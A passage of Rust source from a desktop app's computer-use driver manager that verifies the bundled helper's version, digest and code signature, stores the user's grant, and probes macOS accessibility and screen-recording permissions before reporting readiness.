    matches!((std::fs::canonicalize(left), std::fs::canonicalize(right)), (Ok(left), Ok(right)) if left == right)
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
fn release_self_test_call_allowed(name: &str, arguments: &Value) -> bool {
    if name == "check_permissions" {
        return arguments
            .as_object()
            .is_some_and(|values| values.keys().all(|key| key == "prompt"));
    }
    if name == "launch_app" {
        let Some(name) = arguments.get("name").and_then(Value::as_str) else {
            return false;
        };
        #[cfg(target_os = "macos")]
        {
            // The QA launcher starts its two signed fixtures by exact path.
            // A global LaunchServices name is not proof of fixture identity.
            let _ = name;
            return false;
        }
        #[cfg(target_os = "windows")]
        return std::env::current_exe()
            .ok()
            .and_then(|path| {
                Some(
                    path.parent()?
                        .join("native/fixtures/clovy-computer-use-fixture.exe"),
                )
            })
            .is_some_and(|fixture| {
                same_path(Path::new(name), &fixture)
                    && crate::computer_use_windows::verify_fixture(&fixture).is_ok()
            });
    }
    let Some(pid) = arguments.get("pid").and_then(Value::as_i64) else {
        return false;
    };
    let Some(identity) = app_identity(pid) else {
        return false;
    };
    #[cfg(target_os = "windows")]
    {
        let fixture = std::env::current_exe().ok().and_then(|path| {
            Some(
                path.parent()?
                    .join("native/fixtures/clovy-computer-use-fixture.exe"),
            )
        });
        return fixture.is_some_and(|fixture| {
            same_path(&identity.executable_path, &fixture)
                && crate::computer_use_windows::verify_fixture(&fixture).is_ok()
        });
    }
    #[cfg(target_os = "macos")]
    {
        matches!(
            identity.bundle_id.as_str(),
            "dev.guilhermexp.clovy.computer-use-self-test.target"
                | "dev.guilhermexp.clovy.computer-use-self-test.observer"
        ) && identity
            .executable_path
            .file_name()
            .is_some_and(|name| name == "computer-use-fixture")
            && crate::computer_use_macos::verify_fixture(
                &identity.executable_path,
                &identity.bundle_id,
            )
    }
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
fn sanitize_release_self_test_result(
    name: &str,
    arguments: &Value,
    result: Value,
) -> Option<Value> {
    if name != "list_windows" {
        return Some(result);
    }

    let requested_pid = arguments.get("pid")?.as_i64()?;
    let windows = structured(&result)?
        .get("windows")?
        .as_array()?
        .iter()
        .filter(|window| window.get("pid").and_then(Value::as_i64) == Some(requested_pid))
        .cloned()
        .collect::<Vec<_>>();
    let window_count = windows.len();
    Some(mcp_text(json!({
        "windows": windows,
        "window_count": window_count,
    })))
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
fn release_self_test_error(id: Value, code: i64, message: &str) -> Value {
    json!({"jsonrpc": "2.0", "id": id, "error": {"code": code, "message": message}})
}

#[cfg(any(target_os = "macos", target_os = "windows"))]
async fn write_release_self_test_response(
    stdout: &mut BufWriter<tokio::io::Stdout>,
    response: Value,
) -> Result<(), String> {
    let mut bytes = serde_json::to_vec(&response).map_err(|error| error.to_string())?;
    bytes.push(b'\n');
    stdout
        .write_all(&bytes)
        .await
        .map_err(|error| error.to_string())?;
    stdout.flush().await.map_err(|error| error.to_string())
}

fn driver_launch_spec(
    executable: &Path,
    socket_path: &Path,
    capability: &str,
    permission_prompt: Option<DriverPermissionPrompt>,
    browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
) -> Result<DriverLaunchSpec, AppError> {
    let bundle = executable
        .ancestors()
        .find(|path| {
            path.extension()
                .is_some_and(|extension| extension.eq_ignore_ascii_case("app"))
        })
        .ok_or_else(|| {
            AppError::new(
                "computer_use_driver_start_failed",
                "The bundled Computer use driver is not inside a macOS app bundle.",
            )
        })?;
    let socket = socket_path.to_str().ok_or_else(|| {
        AppError::new(
            "computer_use_driver_start_failed",
            "The Computer use driver channel path is not valid UTF-8.",
        )
    })?;
    let bundle = bundle.to_str().ok_or_else(|| {
        AppError::new(
            "computer_use_driver_start_failed",
            "The Computer use driver bundle path is not valid UTF-8.",
        )
    })?;
    let mut args = vec![
        "-n".to_string(),
        "-g".to_string(),
        "--env".to_string(),
        format!("CLOVY_COMPUTER_USE_SOCKET={socket}"),
        "--env".to_string(),
        format!("CLOVY_COMPUTER_USE_HELPER_CAPABILITY={capability}"),
        "--env".to_string(),
        format!(
            "CLOVY_COMPUTER_USE_RUN_DIR={}",
            socket_path
                .parent()
                .and_then(Path::to_str)
                .ok_or_else(|| AppError::new(
                    "computer_use_driver_start_failed",
                    "Missing private run directory."
                ))?
        ),
    ];
    let (namespace, image) = browser_runtime.paths();
    for (name, value) in [
        ("CLOVY_COMPUTER_USE_BROWSER_NAMESPACE", namespace),
        ("CLOVY_COMPUTER_USE_BROWSER_IMAGE", image),
    ] {
        let value = value
            .to_str()
            .filter(|_| value.is_absolute())
            .ok_or_else(|| {
                AppError::new(
                    "computer_use_driver_start_failed",
                    "Browser authority path is invalid.",
                )
            })?;
        args.extend(["--env".to_string(), format!("{name}={value}")]);
    }
    if let Some(prompt) = permission_prompt {
        args.extend([
            "--env".to_string(),
            format!(
                "CLOVY_COMPUTER_USE_PERMISSION_PROMPT={}",
                prompt.as_env_value()
            ),
        ]);
    }
    args.extend([
        bundle.to_string(),
        "--args".to_string(),
        "mcp-daemon".to_string(),
    ]);
    Ok(DriverLaunchSpec {
        program: PathBuf::from("/usr/bin/open"),
        args,
    })
}

#[cfg(target_os = "macos")]
async fn connect_driver_socket(path: &Path) -> io::Result<UnixStream> {
    let deadline = Instant::now() + DRIVER_START_TIMEOUT;
    loop {
        let error = match UnixStream::connect(path).await {
            Ok(stream) => return Ok(stream),
            Err(error) => error,
        };
        if Instant::now() >= deadline {
            return Err(error);
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

#[cfg(target_os = "macos")]
fn process_group_is_owned(pid: u32) -> bool {
    libc::pid_t::try_from(pid)
        .ok()
        .is_some_and(|pid| unsafe { libc::getpgid(pid) } == pid)
}

#[cfg(target_os = "macos")]
async fn wait_for_process_exit(pid: u32, timeout: Duration) -> bool {
    if pid == 0 {
        return true;
    }
    let Ok(pid) = libc::pid_t::try_from(pid) else {
        return true;
    };
    let deadline = Instant::now() + timeout;
    loop {
        let result = unsafe { libc::kill(pid, 0) };
        if result == -1 && io::Error::last_os_error().raw_os_error() == Some(libc::ESRCH) {
            return true;
        }
        if Instant::now() >= deadline {
            return false;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

fn next_permission_prompt(probe: &PermissionProbe) -> Option<DriverPermissionPrompt> {
    if !probe.accessibility {
        Some(DriverPermissionPrompt::Accessibility)
    } else if !probe.screen_recording {
        Some(DriverPermissionPrompt::ScreenRecording)
    } else {
        None
    }
}

fn driver_command(path: &Path) -> Command {
    let mut command = crate::hide_console::tokio_command(path);
    for (name, _) in std::env::vars_os() {
        if should_scrub_driver_env(&name) {
            command.env_remove(name);
        }
    }
    command
}

async fn bounded_command_output(
    mut command: Command,
    timeout: Duration,
    code: &'static str,
    message: &'static str,
) -> Result<std::process::Output, AppError> {
    command.kill_on_drop(true);
    tokio::time::timeout(timeout, command.output())
        .await
        .map_err(|_| AppError::new(code, format!("{message} The command timed out.")))?
        .map_err(|error| AppError::new(code, format!("{message} {error}")))
}

fn should_scrub_driver_env(name: &OsStr) -> bool {
    let name = name.to_string_lossy();
    name.starts_with("AGENT_DESKTOP_")
        || name.starts_with("CUA_DRIVER_RS_")
        || name.starts_with("CLOVY_CUA_DRIVER")
        || name.starts_with("JUNE_CUA_DRIVER")
        || name == "CLOVY_COMPUTER_USE_BACKEND"
        || name == "CLOVY_COMPUTER_USE_HELPER_CAPABILITY"
        || name == "CLOVY_COMPUTER_USE_PERMISSION_PROMPT"
        || name == "CLOVY_COMPUTER_USE_SOCKET"
        || name == "CLOVY_COMPUTER_USE_RUN_DIR"
        || name == "CLOVY_COMPUTER_USE_BROWSER_NAMESPACE"
        || name == "CLOVY_COMPUTER_USE_BROWSER_IMAGE"
        || matches!(
            name.as_ref(),
            "HTTP_PROXY"
                | "HTTPS_PROXY"
                | "ALL_PROXY"
                | "http_proxy"
                | "https_proxy"
                | "all_proxy"
                | "REQUESTS_CA_BUNDLE"
                | "SSL_CERT_FILE"
        )
}

fn mcp_error_message(value: &Value) -> String {
    value
        .get("message")
        .and_then(Value::as_str)
        .unwrap_or("The Computer use driver returned an error.")
        .to_string()
}

fn tool_result_text(result: &Value) -> Option<String> {
    result
        .get("content")?
        .as_array()?
        .iter()
        .find(|part| part.get("type").and_then(Value::as_str) == Some("text"))?
        .get("text")?
        .as_str()
        .map(str::to_string)
}

/// Error envelopes are action receipts too. Retain the engine code, delivery,
/// retry advice and evidence when passing an error through the policy broker.
fn driver_result_error(result: &Value) -> AppError {
    let receipt = structured(result).cloned().unwrap_or_else(|| json!({}));
    let engine_code = receipt
        .pointer("/error/code")
        .or_else(|| receipt.get("code"))
        .and_then(Value::as_str);
    let mut error = AppError::new(
        engine_code.unwrap_or("computer_use_driver_failed"),
        tool_result_text(result)
            .unwrap_or_else(|| "The Computer use driver rejected the action.".to_string()),
    );
    let mut details = json!({ "engineReceipt": receipt });
    if let Some(disposition) = receipt.get("disposition") {
        details["disposition"] = disposition.clone();
    }
    if let Some(modality) = receipt
        .get("effective_modality")
        .or_else(|| receipt.get("modality"))
    {
        details["modality"] = modality.clone();
    }
    error.details = Some(details);
    error
}

#[cfg(not(debug_assertions))]
fn release_grant_file(app: &AppHandle) -> Result<PathBuf, AppError> {
    crate::app_paths::app_config_dir(app)
        .map(|directory| directory.join(GRANT_FILE_NAME))
        .map_err(|error| AppError::new("computer_use_grant_failed", error.to_string()))
}

#[cfg(debug_assertions)]
pub(crate) async fn grant_enabled(_app: &AppHandle) -> bool {
    DEVELOPMENT_GRANT.load(Ordering::SeqCst)
}

#[cfg(all(not(debug_assertions), any(target_os = "macos", target_os = "windows")))]
pub(crate) async fn grant_enabled(app: &AppHandle) -> bool {
    let Ok(path) = release_grant_file(app) else {
        return false;
    };
    tokio::task::spawn_blocking(move || {
        std::fs::read(path).is_ok_and(|value| value == b"enabled\n")
    })
    .await
    .unwrap_or(false)
}

#[cfg(all(
    not(debug_assertions),
    not(any(target_os = "macos", target_os = "windows"))
))]
pub(crate) async fn grant_enabled(_app: &AppHandle) -> bool {
    false
}

#[cfg(debug_assertions)]
async fn store_grant(_app: &AppHandle, enabled: bool) -> Result<(), AppError> {
    DEVELOPMENT_GRANT.store(enabled, Ordering::SeqCst);
    Ok(())
}

#[cfg(all(not(debug_assertions), any(target_os = "macos", target_os = "windows")))]
async fn store_grant(app: &AppHandle, enabled: bool) -> Result<(), AppError> {
    let path = release_grant_file(app)?;
    tokio::task::spawn_blocking(move || {
        if !enabled {
            return match std::fs::remove_file(&path) {
                Ok(()) => Ok(()),
                Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(()),
                Err(error) => Err(error),
            };
        }

        let parent = path.parent().ok_or_else(|| {
            io::Error::new(io::ErrorKind::InvalidInput, "grant path has no parent")
        })?;
        std::fs::create_dir_all(parent)?;
        let temporary = path.with_extension("tmp");
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&temporary)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            file.set_permissions(std::fs::Permissions::from_mode(0o600))?;
        }
        file.write_all(b"enabled\n")?;
        file.sync_all()?;
        std::fs::rename(temporary, path)
    })
    .await
    .map_err(|error| AppError::new("computer_use_grant_failed", error.to_string()))?
    .map_err(|error| AppError::new("computer_use_grant_failed", error.to_string()))
}

#[cfg(all(
    not(debug_assertions),
    not(any(target_os = "macos", target_os = "windows"))
))]
async fn store_grant(_app: &AppHandle, _enabled: bool) -> Result<(), AppError> {
    Err(AppError::new(
        "computer_use_unsupported",
        "Computer use requires macOS or Windows.",
    ))
}

fn bundled_driver_executable(app: &AppHandle) -> Result<PathBuf, AppError> {
    let pin = driver_pin();
    #[cfg(not(target_os = "windows"))]
    let packaged = app.path().resource_dir().ok().map(|resources| {
        resources
            .join("native")
            .join("bin")
            .join(&pin.bundle_name)
            .join("Contents")
            .join("MacOS")
            .join(&pin.executable)
    });
    #[cfg(target_os = "windows")]
    let packaged =
        app.path().resource_dir().ok().map(|resources| {
            resources.join("native/bin/computer-use/clovy-computer-use-driver.exe")
        });
    #[cfg(not(target_os = "windows"))]
    let development = Path::new(env!("CARGO_MANIFEST_DIR")).parent().map(|repo| {
        repo.join(".tauri-helper")
            .join(&pin.bundle_name)
            .join("Contents")
            .join("MacOS")
            .join(&pin.executable)
    });
    #[cfg(target_os = "windows")]
    let development = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .map(|repo| repo.join(".tauri-helper/computer-use/clovy-computer-use-driver.exe"));
    let candidates = if cfg!(debug_assertions) {
        [development, packaged]
    } else {
        [packaged, development]
    };
    candidates
        .into_iter()
        .flatten()
        .find(|candidate| candidate.is_file() && driver_stamp_matches(candidate, &pin))
        .ok_or_else(|| {
            AppError::new(
                "computer_use_driver_missing",
                "This build does not contain the pinned Computer use driver.",
            )
        })
}

fn driver_stamp_matches(executable: &Path, pin: &DriverPin) -> bool {
    #[cfg(not(target_os = "windows"))]
    let Some(contents) = executable.parent().and_then(Path::parent) else {
        return false;
    };
    #[cfg(not(target_os = "windows"))]
    let stamp = contents
        .join("Resources")
        .join("clovy-computer-use-pin.json");
    #[cfg(target_os = "windows")]
    let stamp = match executable.parent() {
        Some(parent) => parent.join("clovy-computer-use-pin.json"),
        None => return false,
    };
    let Ok(raw) = std::fs::read_to_string(stamp) else {
        return false;
    };
    let Ok(value) = serde_json::from_str::<Value>(&raw) else {
        return false;
    };
    value.get("version").and_then(Value::as_str) == Some(pin.version.as_str())
        && value.get("sourceCommit").and_then(Value::as_str) == Some(pin.source_commit.as_str())
}

fn file_fingerprint(path: &Path) -> io::Result<FileFingerprint> {
    let metadata = std::fs::metadata(path)?;
    let modified_ns = metadata
        .modified()
        .ok()
        .and_then(|modified| modified.duration_since(UNIX_EPOCH).ok())
        .map(|duration| duration.as_nanos())
        .unwrap_or(0);
    #[cfg(unix)]
    use std::os::unix::fs::MetadataExt;

    Ok(FileFingerprint {
        path: std::fs::canonicalize(path)?,
        length: metadata.len(),
        modified_ns,
        #[cfg(unix)]
        device: metadata.dev(),
        #[cfg(unix)]
        inode: metadata.ino(),
    })
}

#[cfg(target_os = "macos")]
fn packaged_driver_bundles(path: &Path) -> Result<Option<PackagedDriverBundles>, AppError> {
    let app_ancestors = path
        .ancestors()
        .filter(|path| {
            path.extension()
                .is_some_and(|extension| extension.eq_ignore_ascii_case("app"))
        })
        .map(PathBuf::from)
        .collect::<Vec<_>>();
    let (Some(helper), Some(outer)) = (app_ancestors.first(), app_ancestors.get(1)) else {
        return Ok(None);
    };
    let expected_outer_executable = outer
        .join("Contents")
        .join("MacOS")
        .join(crate::app_identity::MAIN_EXECUTABLE);
    if !std::env::current_exe()
        .ok()
        .is_some_and(|current| same_path(&current, &expected_outer_executable))
    {
        return Err(AppError::new(
            "computer_use_driver_signature_failed",
            "The Computer use driver is not nested under the running Clovy app.",
        ));
    }

    let outer_resources = outer
        .join("Contents")
        .join("_CodeSignature")
        .join("CodeResources");
    let helper_resources = helper
        .join("Contents")
        .join("_CodeSignature")
        .join("CodeResources");
    let fingerprint_file = |path: &Path| {
        file_fingerprint(path).map_err(|error| {
            AppError::new(
                "computer_use_driver_signature_failed",
                format!("The Computer use signature fingerprint is unavailable. {error}"),
            )
        })
    };
    let fingerprint = BundleFingerprint {
        outer_executable: fingerprint_file(&expected_outer_executable)?,
        outer_resources: fingerprint_file(&outer_resources)?,
        helper_executable: fingerprint_file(path)?,
        helper_resources: fingerprint_file(&helper_resources)?,
    };
    Ok(Some(PackagedDriverBundles {
        outer: outer.clone(),
        helper: helper.clone(),
        fingerprint,
    }))
}

#[cfg(not(target_os = "macos"))]
fn packaged_driver_bundles(_path: &Path) -> Result<Option<PackagedDriverBundles>, AppError> {
    Ok(None)
}

async fn verify_packaged_driver_signatures(
    state: &ComputerUseState,
    path: &Path,
    force: bool,
) -> Result<(), AppError> {
    #[cfg(any(target_os = "macos", target_os = "windows"))]
    {
        let expected = option_env!("CLOVY_COMPUTER_USE_HELPER_SHA256")
            .filter(|hash| hash.len() == 64)
            .ok_or_else(|| {
                AppError::new(
                    "computer_use_driver_mismatch",
                    "The signed build has no bound Computer use helper digest.",
                )
            })?;
        let file = std::fs::File::open(path)
            .map_err(|error| AppError::new("computer_use_driver_mismatch", error.to_string()))?;
        let mut digest = Sha256::new();
        std::io::copy(&mut std::io::BufReader::new(file), &mut digest)
            .map_err(|error| AppError::new("computer_use_driver_mismatch", error.to_string()))?;
        if format!("{:x}", digest.finalize()) != expected {
            return Err(AppError::new(
                "computer_use_driver_mismatch",
                "The Computer use helper differs from this signed Clovy build.",
            ));
        }
        #[cfg(target_os = "windows")]
        crate::computer_use_windows::verify_signed_peer(path).map_err(|error| {
            AppError::new("computer_use_driver_signature_failed", error.to_string())
        })?;
    }
    let Some(bundles) = packaged_driver_bundles(path)? else {
        return Ok(());
    };
    let mut cache = state.signature_verification.lock().await;
    if signature_cache_matches(cache.as_ref(), &bundles.fingerprint, force) {
        return Ok(());
    }

    verify_bundle_signature(bundles.outer.clone()).await?;
    verify_bundle_signature(bundles.helper.clone()).await?;
    *cache = Some(CachedBundleSignature {
        fingerprint: bundles.fingerprint,
    });
    Ok(())
}

fn signature_cache_matches(
    cached: Option<&CachedBundleSignature>,
    fingerprint: &BundleFingerprint,
    force: bool,
) -> bool {
    // SECURITY: This session-local metadata fingerprint is only a cache
    // invalidation key after a successful `codesign --verify --strict`; it is
    // not treated as code identity. An attacker able to restore these fields
    // still cannot inherit the original helper's TCC grant because macOS keys
    // that grant to its signed code identity/cdhash, or connect to the genuine
    // helper because every accepted socket is checked live by audit token
    // against Clovy's stable identifier and the helper-derived Team OU. Explicit retry
    // bypasses this cache, and a new Clovy process begins with an empty cache.
    !force && cached.is_some_and(|cached| cached.fingerprint == *fingerprint)
}

#[cfg(target_os = "macos")]
async fn verify_bundle_signature(path: PathBuf) -> Result<(), AppError> {
    tokio::task::spawn_blocking(move || verify_bundle_signature_sync(&path))
        .await
        .map_err(|error| {
            AppError::new(
                "computer_use_driver_signature_failed",
                format!("The Computer use signature verifier could not be joined. {error}"),
            )
        })?
}

#[cfg(not(target_os = "macos"))]
async fn verify_bundle_signature(_path: PathBuf) -> Result<(), AppError> {
    Ok(())
}

#[cfg(target_os = "macos")]
fn verify_bundle_signature_sync(path: &Path) -> Result<(), AppError> {
    use std::os::unix::process::CommandExt;
    use std::process::Stdio;

    let mut command = crate::hide_console::command("/usr/bin/codesign");
    command
        .args(["--verify", "--strict"])
        .arg(path)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .process_group(0);
    let mut child = command.spawn().map_err(|error| {
        AppError::new(
            "computer_use_driver_signature_failed",
            format!("The Computer use signature verifier could not start. {error}"),
        )
    })?;
    let pid = child.id();
    let deadline = Instant::now() + SIGNATURE_VERIFICATION_TIMEOUT;
    loop {
        match child.try_wait() {
            Ok(Some(status)) if status.success() => return Ok(()),
            Ok(Some(_)) => {
                return Err(AppError::new(
                    "computer_use_driver_signature_failed",
                    "The signed Computer use bundle could not be verified.",
                ));
            }
            Ok(None) if Instant::now() < deadline => {
                std::thread::sleep(Duration::from_millis(10));
            }
            Ok(None) => {
                terminate_owned_process_group(pid, child);
                return Err(AppError::new(
                    "computer_use_driver_signature_timeout",
                    "The signed Computer use bundle verification timed out.",
                ));
            }
            Err(error) => {
                terminate_owned_process_group(pid, child);
                return Err(AppError::new(
                    "computer_use_driver_signature_failed",
                    format!("The Computer use signature verifier failed. {error}"),
                ));
            }
        }
    }
}

#[cfg(target_os = "macos")]
fn terminate_owned_process_group(pid: u32, child: std::process::Child) {
    signal_process_group(pid, libc::SIGTERM);
    let outcome = crate::shutdown::terminate_child_with(
        child,
        SIGNATURE_TERMINATION_GRACE,
        SIGNATURE_REAP_TIMEOUT,
        move |child| {
            signal_process_group(pid, libc::SIGKILL);
            let _ = child.kill();
        },
    );
    // The leader can exit before a verifier worker. Sweep the group after the
    // bounded leader wait so no resource-validation descendant survives.
    signal_process_group(pid, libc::SIGKILL);
    if !matches!(
        outcome,
        crate::shutdown::ChildTermination::Exited | crate::shutdown::ChildTermination::Killed
    ) {
        tracing::warn!(?outcome, pid, "signature verifier could not be reaped");
    }
}

#[cfg(target_os = "macos")]
fn signal_process_group(pid: u32, signal: libc::c_int) {
    if let Ok(pid) = libc::pid_t::try_from(pid) {
        let _ = unsafe { libc::kill(-pid, signal) };
    }
}

fn permission_drag_bundle_path(
    target: crate::computer_use_permission_drag::PermissionDragTarget,
    driver_executable: &Path,
    host_executable: &Path,
) -> Option<PathBuf> {
    let executable = match target {
        crate::computer_use_permission_drag::PermissionDragTarget::Helper => driver_executable,
        crate::computer_use_permission_drag::PermissionDragTarget::Host => host_executable,
    };
    crate::computer_use_permission_drag::app_bundle_path(executable).map(Path::to_path_buf)
}

#[cfg(target_os = "macos")]
pub(crate) unsafe fn begin_permission_drag(
    app: &AppHandle,
    window: &objc2::runtime::AnyObject,
    event: *mut objc2::runtime::AnyObject,
) -> bool {
    let Some(target) = crate::computer_use_permission_drag::permission_drag_target() else {
        return false;
    };
    let Ok(executable) = bundled_driver_executable(app) else {
        return false;
    };
    let Ok(host_executable) = std::env::current_exe() else {
        return false;
    };
    let Some(bundle) = permission_drag_bundle_path(target, &executable, &host_executable) else {
        return false;
    };
    // SAFETY: The main NSWindow sendEvent: bridge forwards the active window
    // and event on AppKit's main thread.
    unsafe { crate::computer_use_permission_drag::begin_permission_drag(&bundle, window, event) }
}

async fn driver_version(path: &Path) -> Result<String, AppError> {
    let mut command = driver_command(path);
    command.arg("--version");
    let output = bounded_command_output(
        command,
        EXTERNAL_COMMAND_TIMEOUT,
        "computer_use_driver_version_failed",
        "The bundled Computer use driver version check failed.",
    )
    .await?;
    if !output.status.success() {
        return Err(AppError::new(
            "computer_use_driver_version_failed",
            "The bundled Computer use driver could not be verified.",
        ));
    }
    let raw = format!(
        "{} {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let fields: Vec<_> = raw.split_whitespace().collect();
    let pin = driver_pin();
    if fields.as_slice()
        == [
            "clovy-computer-use-driver",
            pin.version.as_str(),
            pin.source_commit.as_str(),
        ]
    {
        Ok(pin.version)
    } else {
        Err({
            AppError::new(
                "computer_use_driver_version_mismatch",
                "The bundled Computer use driver version does not match Clovy's pin.",
            )
        })
    }
}

async fn probe_permissions(
    state: &ComputerUseState,
    path: &Path,
    prompt: bool,
) -> Result<PermissionProbe, AppError> {
    let path = path.to_path_buf();
    let (namespace, image) = state.browser_runtime()?.paths();
    let namespace = namespace.to_path_buf();
    let image = image.to_path_buf();
    state
        .permission_probe
        .run(prompt, move |prompt| {
            let path = path.clone();
            let runtime = crate::computer_use_owned_runtime::OwnedBrowserRuntime::new(
                namespace.clone(),
                image.clone(),
            );
            async move { probe_permissions_uncoordinated(&path, prompt, &runtime).await }
        })
        .await
}

async fn probe_permissions_uncoordinated(
    path: &Path,
    prompt: bool,
    browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
) -> Result<PermissionProbe, AppError> {
    let initial = read_permission_probe(path, None, browser_runtime).await?;
    if prompt {
        if let Some(next) = next_permission_prompt(&initial) {
            return read_permission_probe(path, Some(next), browser_runtime).await;
        }
    }
    Ok(initial)
}

async fn read_permission_probe(
    path: &Path,
    permission_prompt: Option<DriverPermissionPrompt>,
    browser_runtime: &crate::computer_use_owned_runtime::OwnedBrowserRuntime,
) -> Result<PermissionProbe, AppError> {
    let mut client = DriverClient::start(path, permission_prompt, browser_runtime).await?;
    let mut ignore_notification = |_: &Value| {};
    let result = client
        .call_tool(
            "check_permissions",
            json!({ "prompt": false }),
            &mut ignore_notification,
        )
        .await;
    client.stop().await;
    let result = result?;
    let structured = result
        .get("structuredContent")
        .or_else(|| result.get("structured_content"))
        .cloned()
        .unwrap_or_else(|| json!({}));
    let accessibility = structured
        .get("accessibility")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let preflight = structured
        .get("screen_recording")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let capturable = structured
        .get("screen_recording_capturable")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    Ok(PermissionProbe {
        accessibility,
        // The helper is fresh for every probe. macOS evaluates Accessibility
        // against the nested helper and Screen Recording against its signed
        // outer Clovy responsible app. Keep accepting the live field for
        // compatibility with older helpers.
        screen_recording: preflight && capturable,
    })
}

/// What the bundled driver check found.
pub(crate) enum DriverCheck {
    Missing(String),
    Mismatch(String),
    Ready(String),
}

/// The local facts Computer use status depends on (D4: nothing remote).
pub(crate) struct StatusChecks {
    pub platform_supported: bool,
    pub grant_enabled: bool,
    pub driver: DriverCheck,
    pub permissions: Option<Result<PermissionProbe, AppError>>,
}

fn status_from_checks(checks: StatusChecks) -> ComputerUseStatus {
    let StatusChecks {
        platform_supported,
        grant_enabled,
        driver,
        permissions,
    } = checks;
    let status = |state: &str, error: Option<String>| ComputerUseStatus {
        platform: if cfg!(target_os = "windows") {
            "windows"
        } else if cfg!(target_os = "macos") {
            "macos"
        } else {
            "unsupported"
        },
        platform_supported,
        grant_enabled,
        driver_available: false,
        driver_version: None,
        accessibility: false,
        screen_recording: false,
        ready: false,
        state: state.to_string(),
        error,
    };
    if !platform_supported {
        return ComputerUseStatus {
            grant_enabled: false,
            ..status("unsupported", None)
        };
    }
    let version = match driver {
        DriverCheck::Missing(error) if grant_enabled => {
            return status("driver_missing", Some(error));
        }
        DriverCheck::Missing(_) => return status("off", None),
        DriverCheck::Mismatch(error) => return status("driver_mismatch", Some(error)),
        DriverCheck::Ready(version) => version,
    };
    let driver_ready = ComputerUseStatus {
        driver_available: true,
        driver_version: Some(version),
        ..status("off", None)
    };
    if !grant_enabled {
        return driver_ready;
    }
    let permissions = permission_probe_status(permissions.unwrap_or_else(|| {
        Err(AppError::new(
            "computer_use_permission_probe_missing",
            "The local Computer use readiness check did not run.",
        ))
    }));
    ComputerUseStatus {
        accessibility: permissions.accessibility,
        screen_recording: permissions.screen_recording,
        ready: permissions.ready,
        state: permissions.state.to_string(),
        error: permissions.error,
        ..driver_ready
    }
}

/// Computer use status from local facts only: the user's grant, the pinned
/// bundled driver and its signature, and the macOS permissions (ADR-0067).
/// No Clovy plan, vision model or remote rollout answer is consulted.
async fn status_inner(app: &AppHandle, computer_use: &ComputerUseState) -> ComputerUseStatus {
    let platform_supported = cfg!(any(target_os = "macos", target_os = "windows"));
    let grant_enabled = platform_supported && grant_enabled(app).await;
    let mut checks = StatusChecks {
        platform_supported,
        grant_enabled,
        driver: DriverCheck::Missing(String::new()),
        permissions: None,
    };
    if !platform_supported {
        return status_from_checks(checks);
    }
    let path = match bundled_driver_executable(app) {
        Ok(path) => path,
        Err(error) => {
            checks.driver = DriverCheck::Missing(error.message);
            return status_from_checks(checks);
        }
    };
    if let Err(error) = verify_packaged_driver_signatures(computer_use, &path, false).await {
        checks.driver = DriverCheck::Mismatch(error.message);
        return status_from_checks(checks);
    }
    checks.driver = match driver_version(&path).await {
        Ok(version) => DriverCheck::Ready(version),
        Err(error) => DriverCheck::Mismatch(error.message),
    };
    if grant_enabled && matches!(checks.driver, DriverCheck::Ready(_)) {
        checks.permissions = Some(probe_permissions(computer_use, &path, false).await);
    }
    status_from_checks(checks)
}

fn permission_probe_status(result: Result<PermissionProbe, AppError>) -> PermissionProbeStatus {
    match result {
        Ok(permissions) => {
            let ready = permissions.accessibility && permissions.screen_recording;
            let state = if ready { "ready" } else { "permission_missing" };
            PermissionProbeStatus {
                accessibility: permissions.accessibility,
                screen_recording: permissions.screen_recording,
                ready,
                state,
                error: None,
            }
        }
        Err(error) => PermissionProbeStatus {
            accessibility: false,
            screen_recording: false,
            ready: false,
            state: "error",
            error: Some(error.message),
        },
    }
}

#[allow(dead_code)] // Preserved for the neutral agent capability adapter follow-up.
pub(crate) async fn runtime_ready(app: &AppHandle) -> bool {
    let state = app.state::<ComputerUseState>();
    let expected_epoch = app
        .try_state::<ComputerUseState>()
        .map(|state| state.epoch.load(Ordering::SeqCst));
    let mut ready = if !grant_enabled(app).await {
        false
    } else if let Ok(path) = bundled_driver_executable(app) {
        verify_packaged_driver_signatures(&state, &path, false)
            .await
            .is_ok()
            && driver_version(&path).await.is_ok()
            && probe_permissions(&state, &path, false)
                .await
                .is_ok_and(|probe| probe.accessibility && probe.screen_recording)
    } else {
        false
    };
    if let (Some(state), Some(expected_epoch)) =
        (app.try_state::<ComputerUseState>(), expected_epoch)
    {
        match publish_runtime_ready_probe(&state, expected_epoch, ready) {
            Some(previous) if !ready && previous == ready_state_value(true) => {
                stop_inner(app, &state).await;
                replace_runtime_ready(&state, false);
            }
            Some(_) => {}
            None => ready = false,
        }
    }
    if ready {
        schedule_driver_prewarm(app);
    }
    ready
}

/// Start the persistent private driver away from the first model action.
///
/// This shares the same `driver` mutex and cache as `driver_call`, so a focus
/// event, an enable/status refresh, and a real action collapse to one start.
/// The captured epoch also makes a queued prewarm lose to Stop or grant
/// revocation instead of resurrecting a driver after cleanup.
pub(crate) fn schedule_driver_prewarm(app: &AppHandle) {
    let Some(state) = app.try_state::<ComputerUseState>() else {
        return;
    };
    if !runtime_ready_is_current(&state, true) {
        return;
    }
    if !DriverPrewarmInProgress::try_begin(&state.driver_prewarm_in_flight) {
        return;
    }
    let expected_epoch = state.epoch.load(Ordering::SeqCst);
    let app = app.clone();
    tauri::async_runtime::spawn(async move {
        let state = app.state::<ComputerUseState>();
        let _prewarm_in_progress = DriverPrewarmInProgress(&state.driver_prewarm_in_flight);
        let started_at = Instant::now();
        match prewarm_driver(&app, expected_epoch).await {
            Ok(started) => tracing::info!(
